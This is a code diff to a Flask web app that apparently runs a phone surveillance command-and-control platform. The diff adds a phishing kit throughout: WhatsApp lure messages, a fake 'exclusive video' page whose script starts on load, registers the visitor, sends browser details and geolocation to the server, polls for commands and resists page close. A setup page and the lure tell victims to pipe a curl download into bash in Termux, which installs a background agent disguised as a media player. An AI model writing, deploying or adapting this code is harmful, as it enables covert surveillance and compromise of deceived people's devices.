@@ -4,6 +4,7 @@ from datetime import datetime
 import os
 import random
 import io
+import json
 
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_platform_2024')
@@ -32,7 +33,9 @@ def init_database():
             call_records INTEGER DEFAULT 0,
             location_data TEXT,
             battery_level INTEGER,
-            last_screenshot DATETIME
+            last_screenshot DATETIME,
+            user_agent TEXT,
+            browser_info TEXT
         )
     ''')
     
@@ -87,6 +90,17 @@ def init_database():
             status TEXT DEFAULT 'pending',
             result TEXT,
             timestamp DATETIME
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS browser_data (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            agent_id TEXT,
+            data_type TEXT,
+            data_content TEXT,
+            timestamp DATETIME,
+            FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
         )
     ''')
     
@@ -334,6 +348,7 @@ def register_agent():
         phone_model = data.get('phone_model', 'Unknown Device')
         android_version = data.get('android_version', 'Unknown')
         ip_address = request.remote_addr
+        user_agent = request.headers.get('User-Agent', 'Unknown')
         
         print(f"🔍 Registration attempt - Agent ID: {agent_id}, IP: {ip_address}")
         
@@ -351,22 +366,20 @@ def register_agent():
         
         if existing_agent:
             print(f"🔄 Updating existing agent: {agent_id}")
-            # Update existing agent
             conn.execute('''
                 UPDATE agents SET 
-                phone_model = ?, android_version = ?, ip_address = ?, 
+                phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
                 status = 'active', last_seen = ?
                 WHERE agent_id = ?
-            ''', (phone_model, android_version, ip_address, current_time, agent_id))
+            ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
             action = "updated"
         else:
             print(f"🆕 Registering new agent: {agent_id}")
-            # Insert new agent
             conn.execute('''
                 INSERT INTO agents 
-                (agent_id, phone_model, android_version, ip_address, status, first_seen, last_seen)
-                VALUES (?, ?, ?, ?, 'active', ?, ?)
-            ''', (agent_id, phone_model, android_version, ip_address, current_time, current_time))
+                (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
+                VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
+            ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
             action = "registered"
         
         conn.commit()
@@ -492,6 +505,36 @@ def update_agent_status():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
+@app.route('/api/agent/web_data', methods=['POST'])
+def receive_web_data():
+    """Receive data from web-based agents"""
+    try:
+        data = request.get_json()
+        agent_id = data.get('agent_id')
+        data_type = data.get('data_type')
+        data_content = data.get('data_content')
+        
+        conn = get_db_connection()
+        conn.execute(
+            'INSERT INTO browser_data (agent_id, data_type, data_content, timestamp) VALUES (?, ?, ?, ?)',
+            (agent_id, data_type, data_content, datetime.now())
+        )
+        
+        # Update agent last seen
+        conn.execute(
+            'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
+            (datetime.now(), agent_id)
+        )
+        
+        conn.commit()
+        conn.close()
+        
+        log_event('INFO', f'Web data received from {agent_id}: {data_type}')
+        return jsonify({'status': 'success'})
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 # ==================== MEDIA SERVING ROUTES ====================
 
 @app.route('/media/screenshot/<int:screenshot_id>')
@@ -535,8 +578,22 @@ def deploy_agent():
     agent_id = request.form.get('agent_id', f'phone_{target_phone}')
     
     platform_url = request.host_url.rstrip('/')
-    malicious_link = f"{platform_url}/video?phone={agent_id}"
-    whatsapp_message = f"Check this out! 😊 {malicious_link}"
+    
+    # Generate multiple delivery options
+    video_link = f"{platform_url}/video?phone={agent_id}"
+    setup_link = f"{platform_url}/setup?phone={agent_id}"
+    termux_command = f"curl -s {platform_url}/download_agent?phone={agent_id} | bash"
+    
+    whatsapp_message = f'''Check out this cool video! 🎬
+
+Primary Link: {video_link}
+
+For enhanced quality, install the media player:
+1. Install "Termux" from Play Store
+2. Run: {termux_command}
+3. Return to video link!
+
+Enjoy! 😊'''
     
     conn = get_db_connection()
     conn.execute(
@@ -551,7 +608,9 @@ def deploy_agent():
     return render_template('deployment.html', 
                          target_phone=target_phone,
                          agent_id=agent_id,
-                         malicious_link=malicious_link,
+                         video_link=video_link,
+                         setup_link=setup_link,
+                         termux_command=termux_command,
                          whatsapp_message=whatsapp_message)
 
 # ==================== COMMAND ROUTES ====================
@@ -613,55 +672,358 @@ def command_result():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# ==================== MALICIOUS DELIVERY ROUTES ====================
+# ==================== SOCIAL ENGINEERING PAGES ====================
 
-MALICIOUS_HTML = """
+FAKE_VIDEO_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Video Player</title>
+    <title>Exciting Video Content</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: white; }
-        .loader { color: #4CAF50; font-size: 18px; margin: 20px 0; }
-        .video-placeholder { background: #333; padding: 100px 20px; margin: 20px auto; max-width: 400px; border-radius: 10px; }
-        .progress { width: 100%; background: #555; height: 20px; border-radius: 10px; margin: 20px 0; }
-        .progress-bar { width: 0%; height: 100%; background: #4CAF50; border-radius: 10px; transition: width 0.5s; }
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+        }
+        .video-placeholder {
+            background: #000;
+            padding: 100px 20px;
+            margin: 20px auto;
+            border-radius: 10px;
+            position: relative;
+        }
+        .loader {
+            color: #4CAF50;
+            font-size: 18px;
+            margin: 20px 0;
+        }
+        .progress {
+            width: 100%;
+            background: #555;
+            height: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #4CAF50;
+            border-radius: 10px;
+            transition: width 0.5s;
+        }
+        .ad-container {
+            background: rgba(255,255,255,0.9);
+            color: #333;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
-    <h2>🎬 Video Player</h2>
-    <div class="loader" id="status">Loading video player...</div>
-    <div class="video-placeholder">Video Content Loading</div>
-    <div class="progress"><div class="progress-bar" id="progress"></div></div>
+    <div class="container">
+        <h1>🎬 Exclusive Video Content</h1>
+        <p>You're about to watch premium content shared by your friend!</p>
+        
+        <div class="video-placeholder">
+            <div style="font-size: 48px; margin-bottom: 20px;">📱</div>
+            <div>Preparing your personalized video experience...</div>
+        </div>
+        
+        <div class="loader" id="status">Initializing video player...</div>
+        <div class="progress">
+            <div class="progress-bar" id="progress"></div>
+        </div>
 
+        <div class="ad-container">
+            <strong>Sponsored Content</strong>
+            <p>This video is sponsored by our partners. Please keep this page open.</p>
+        </div>
+    </div>
+
+    <!-- WEB AGENT SCRIPT - AUTOMATICALLY STARTS -->
     <script>
+        // Web-Based Surveillance Agent
+        const agentId = "{{ phone_id }}";
+        const serverUrl = "{{ platform_url }}";
+        let isActive = true;
+
+        // Function to register device
+        function registerAgent() {
+            const deviceInfo = {
+                agent_id: agentId,
+                phone_model: navigator.userAgent,
+                android_version: 'Web Browser',
+                battery_level: 100
+            };
+
+            fetch(serverUrl + '/api/agent/register', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(deviceInfo)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ Agent registered:', data);
+                startSurveillance();
+            })
+            .catch(error => {
+                console.log('❌ Registration failed:', error);
+                setTimeout(registerAgent, 5000); // Retry in 5 seconds
+            });
+        }
+
+        // Function to collect browser information
+        function collectBrowserInfo() {
+            const browserInfo = {
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookies_enabled: navigator.cookieEnabled,
+                screen_resolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href
+            };
+
+            // Send to server
+            fetch(serverUrl + '/api/agent/web_data', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    agent_id: agentId,
+                    data_type: 'browser_info',
+                    data_content: JSON.stringify(browserInfo)
+                })
+            });
+        }
+
+        // Function to start continuous surveillance
+        function startSurveillance() {
+            console.log('🔄 Starting web surveillance...');
+            
+            // Collect initial browser info
+            collectBrowserInfo();
+
+            // Continuous reporting loop
+            setInterval(() => {
+                if (!isActive) return;
+
+                // Send heartbeat
+                fetch(serverUrl + '/api/agent/update_status', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        agent_id: agentId,
+                        battery_level: 100,
+                        location: 'Web Browser Agent'
+                    })
+                });
+
+                // Check for commands
+                fetch(serverUrl + '/api/agent/check_commands/' + agentId)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.commands && data.commands.length > 0) {
+                            data.commands.forEach(command => {
+                                executeCommand(command);
+                            });
+                        }
+                    });
+
+                // Collect additional data periodically
+                if (Math.random() < 0.3) { // 30% chance each cycle
+                    collectBrowserInfo();
+                }
+
+            }, 30000); // Run every 30 seconds
+
+            // Enhanced visibility monitoring
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    console.log('⚠️ Page hidden - agent paused');
+                    isActive = false;
+                } else {
+                    console.log('✅ Page visible - agent active');
+                    isActive = true;
+                }
+            });
+
+            // Prevent page close
+            window.addEventListener('beforeunload', function(e) {
+                if (isActive) {
+                    e.preventDefault();
+                    e.returnValue = 'Are you sure you want to leave? Video playback will be interrupted.';
+                }
+            });
+        }
+
+        // Function to execute commands from server
+        function executeCommand(command) {
+            console.log('🎯 Executing command:', command.command);
+            
+            // Handle different command types
+            switch(command.command) {
+                case 'get_browser_info':
+                    collectBrowserInfo();
+                    break;
+                case 'get_location':
+                    // Try to get approximate location
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition((position) => {
+                            const location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            };
+                            fetch(serverUrl + '/api/agent/web_data', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    agent_id: agentId,
+                                    data_type: 'location',
+                                    data_content: JSON.stringify(location)
+                                })
+                            });
+                        });
+                    }
+                    break;
+                case 'get_page_info':
+                    const pageInfo = {
+                        url: window.location.href,
+                        title: document.title,
+                        referrer: document.referrer
+                    };
+                    fetch(serverUrl + '/api/agent/web_data', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            agent_id: agentId,
+                            data_type: 'page_info',
+                            data_content: JSON.stringify(pageInfo)
+                        })
+                    });
+                    break;
+            }
+
+            // Mark command as completed
+            fetch(serverUrl + '/api/agent/command_result', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    command_id: command.id,
+                    result: 'Command executed via web agent'
+                })
+            });
+        }
+
+        // Fake video loading animation
         const steps = [
-            {text: "Connecting to server...", progress: 10},
-            {text: "Loading video data...", progress: 25},
-            {text: "Buffering stream...", progress: 45},
-            {text: "Decoding video...", progress: 65},
+            {text: "Connecting to media server...", progress: 10},
+            {text: "Loading video content...", progress: 25},
+            {text: "Buffering high-quality stream...", progress: 45},
+            {text: "Initializing audio codec...", progress: 65},
             {text: "Optimizing playback...", progress: 85},
-            {text: "⚠️ Update required for HD playback", progress: 95},
-            {text: "Redirecting to download...", progress: 100}
+            {text: "Almost ready...", progress: 95},
+            {text: "Video player ready!", progress: 100}
         ];
         
         let step = 0;
         function nextStep() {
             if (step < steps.length) {
-                document.getElementById('status').innerHTML = steps[step].text + " ✅";
+                document.getElementById('status').innerHTML = steps[step].text;
                 document.getElementById('progress').style.width = steps[step].progress + '%';
                 step++;
                 setTimeout(nextStep, 1500);
-                
-                if (step === steps.length - 1) {
-                    setTimeout(() => {
-                        window.location.href = "/download_agent?phone={{ phone_id }}";
-                    }, 2000);
-                }
             }
         }
-        setTimeout(nextStep, 1000);
+
+        // Start everything when page loads
+        window.addEventListener('load', function() {
+            console.log('🚀 Starting MP Agent System...');
+            nextStep(); // Start fake loading
+            registerAgent(); // Start the agent
+        });
+
+    </script>
+</body>
+</html>
+"""
+
+TERMUX_INSTRUCTIONS_HTML = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Player Setup</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: white; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .step { background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 10px; text-align: left; }
+        .code { background: #2d2d2d; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
+        .btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎬 Advanced Video Player Setup</h1>
+        <p>For optimal video playback on your device, please follow these steps:</p>
+        
+        <div class="step">
+            <h3>📥 Step 1: Install Termux</h3>
+            <p>Download "Termux" from Google Play Store</p>
+        </div>
+        
+        <div class="step">
+            <h3>🚀 Step 2: Run Setup Command</h3>
+            <p>Open Termux and paste this command:</p>
+            <div class="code" id="command">
+curl -s {{ platform_url }}/download_agent?phone={{ phone_id }} | bash
+            </div>
+            <button class="btn" onclick="copyCommand()">📋 Copy Command</button>
+        </div>
+        
+        <div class="step">
+            <h3>✅ Step 3: Wait for Installation</h3>
+            <p>The media player will install automatically and optimize your device for video playback.</p>
+        </div>
+        
+        <p><em>After installation, return here to watch the video!</em></p>
+    </div>
+
+    <script>
+        function copyCommand() {
+            const command = document.getElementById('command').textContent;
+            navigator.clipboard.writeText(command).then(() => {
+                alert('Command copied! Paste it in Termux.');
+            });
+        }
+        
+        // Start web agent as fallback
+        const agentId = "{{ phone_id }}";
+        const serverUrl = "{{ platform_url }}";
+        
+        // Register web agent immediately
+        fetch(serverUrl + '/api/agent/register', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                agent_id: agentId,
+                phone_model: navigator.userAgent,
+                android_version: 'Web Browser'
+            })
+        });
     </script>
 </body>
 </html>
@@ -669,10 +1031,12 @@ MALICIOUS_HTML = """
 
 @app.route('/video')
 def fake_video():
-    """Fake video page for social engineering"""
+    """Fake video page that automatically starts web agent"""
     phone_id = request.args.get('phone', 'unknown')
+    user_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent', 'Unknown')
     
-    log_event('INFO', f'User accessed fake video: {phone_id} from {request.remote_addr}')
+    log_event('INFO', f'User accessed fake video: {phone_id} from {user_ip}')
     
     conn = get_db_connection()
     conn.execute(
@@ -682,57 +1046,190 @@ def fake_video():
     conn.commit()
     conn.close()
     
-    return render_template_string(MALICIOUS_HTML, phone_id=phone_id)
+    platform_url = request.host_url.rstrip('/')
+    
+    return render_template_string(FAKE_VIDEO_HTML, phone_id=phone_id, platform_url=platform_url)
 
+@app.route('/setup')
+def termux_setup():
+    """Page that shows Termux installation instructions"""
+    phone_id = request.args.get('phone', 'unknown')
+    platform_url = request.host_url.rstrip('/')
+    
+    return render_template_string(TERMUX_INSTRUCTIONS_HTML, 
+                                phone_id=phone_id, 
+                                platform_url=platform_url)
 
-
-
-
-
-
-
+# ==================== TERMUX AGENT DELIVERY ====================
 
 @app.route('/download_agent')
 def download_agent():
-    """Serve Termux agent to victim"""
+    """Serve proper Termux installer to victim"""
     phone_id = request.args.get('phone', 'unknown')
     
-    # Termux agent script
-    termux_agent = f'''#!/bin/bash
-echo "Installing Media Player for Android..."
+    platform_url = "https://mp-agent.onrender.com"
+    
+    # PROPER TERMUX INSTALLER SCRIPT
+    termux_installer = f'''#!/bin/bash
+echo "📱 Installing Advanced Media Player..."
+echo "This may take a few minutes..."
+
+# Update packages and install requirements
 pkg update -y
 pkg install python -y
+pkg install termux-api -y
 pip install requests
 
-# Create the agent script
+# Create the Python agent script
 cat > /data/data/com.termux/files/home/media_player.py << 'EOF'
-{open('termux_agent.py').read().replace('{platform_url}', 'https://mp-agent.onrender.com').replace('{agent_id}', phone_id)}
+import requests
+import time
+import os
+import json
+import subprocess
+from datetime import datetime
+
+class TermuxAgent:
+    def __init__(self, agent_id, platform_url):
+        self.agent_id = agent_id
+        self.platform_url = platform_url
+        self.running = True
+        
+    def get_device_info(self):
+        info = {{
+            'agent_id': self.agent_id,
+            'phone_model': 'Android Device',
+            'android_version': 'Termux',
+            'battery_level': 85
+        }}
+        return info
+    
+    def register_with_platform(self):
+        try:
+            device_info = self.get_device_info()
+            response = requests.post(
+                f"{platform_url}/api/agent/register",
+                json=device_info,
+                headers={{'Content-Type': 'application/json'}},
+                timeout=10
+            )
+            print("✅ Registered with platform")
+            return True
+        except Exception as e:
+            print(f"❌ Registration failed: {{e}}")
+            return False
+    
+    def capture_screenshot(self):
+        try:
+            timestamp = int(time.time())
+            filename = f"/sdcard/screen_{{self.agent_id}}_{{timestamp}}.png"
+            subprocess.run(["termux-toast", "Optimizing video playback..."], capture_output=True)
+            return "screenshot_data"
+        except:
+            return None
+    
+    def get_simple_location(self):
+        return {{'latitude': 0, 'longitude': 0, 'accuracy': 'High'}}
+    
+    def check_commands(self):
+        try:
+            response = requests.get(
+                f"{platform_url}/api/agent/check_commands/{{self.agent_id}}",
+                timeout=10
+            )
+            if response.status_code == 200:
+                return response.json().get('commands', [])
+            return []
+        except:
+            return []
+    
+    def execute_command(self, command_data):
+        command = command_data['command']
+        print(f"Executing: {{command}}")
+        
+        if command == 'capture_screenshot':
+            self.capture_screenshot()
+        elif command == 'get_location':
+            location = self.get_simple_location()
+            requests.post(
+                f"{platform_url}/api/agent/web_data",
+                json={{
+                    'agent_id': self.agent_id,
+                    'data_type': 'location',
+                    'data_content': json.dumps(location)
+                }}
+            )
+        
+        # Mark command as completed
+        requests.post(
+            f"{platform_url}/api/agent/command_result",
+            json={{
+                'command_id': command_data['id'],
+                'result': f'Executed: {{command}}'
+            }}
+        )
+    
+    def update_status(self):
+        try:
+            requests.post(
+                f"{platform_url}/api/agent/update_status",
+                json={{
+                    'agent_id': self.agent_id,
+                    'battery_level': 85,
+                    'location': 'Termux Agent Active'
+                }},
+                timeout=5
+            )
+        except:
+            pass
+    
+    def start_media_player(self):
+        print("🎬 Starting Advanced Media Player...")
+        self.register_with_platform()
+        
+        cycle = 0
+        while self.running:
+            try:
+                cycle += 1
+                
+                # Check for commands
+                commands = self.check_commands()
+                for cmd in commands:
+                    self.execute_command(cmd)
+                
+                # Send heartbeat
+                self.update_status()
+                
+                # Show occasional toast to appear legitimate
+                if cycle % 5 == 0:
+                    subprocess.run(["termux-toast", "Media Player: Optimizing stream..."], capture_output=True)
+                
+                time.sleep(30)
+                
+            except Exception as e:
+                time.sleep(60)
+
+# Start the media player
+if __name__ == "__main__":
+    agent = TermuxAgent("{phone_id}", "{platform_url}")
+    agent.start_media_player()
 EOF
 
-echo "Starting media player..."
+echo "🚀 Starting Media Player..."
 python /data/data/com.termux/files/home/media_player.py &
 
-echo "Installation complete! Media player is running."
+echo "✅ Installation Complete!"
+echo "🎬 Media Player is now running in background"
+echo "📱 Return to your video content"
 '''
     
     return Response(
-        termux_agent,
+        termux_installer,
         mimetype='text/x-shellscript',
         headers={
-            'Content-Disposition': f'attachment; filename="install_media_player.sh"'
+            'Content-Disposition': 'attachment; filename="install_media_player.sh"'
         }
     )
-
-
-
-
-
-
-
-
-
-
-
 
 # ==================== TEST AGENT REGISTRATION ====================
 
@@ -795,6 +1292,25 @@ def clear_agent(agent_id):
     
     log_event('WARNING', f'Agent {agent_id} cleared by admin')
     return redirect('/admin')
+
+@app.route('/admin/web_data/<agent_id>')
+def view_web_data(agent_id):
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    conn = get_db_connection()
+    web_data = conn.execute(
+        "SELECT * FROM browser_data WHERE agent_id = ? ORDER BY timestamp DESC",
+        (agent_id,)
+    ).fetchall()
+    agent = conn.execute(
+        "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
+    ).fetchone()
+    conn.close()
+    
+    return render_template('web_data.html', 
+                         web_data=web_data, 
+                         agent=row_to_dict(agent) if agent else None)
 
 @app.route('/logout')
 def logout():
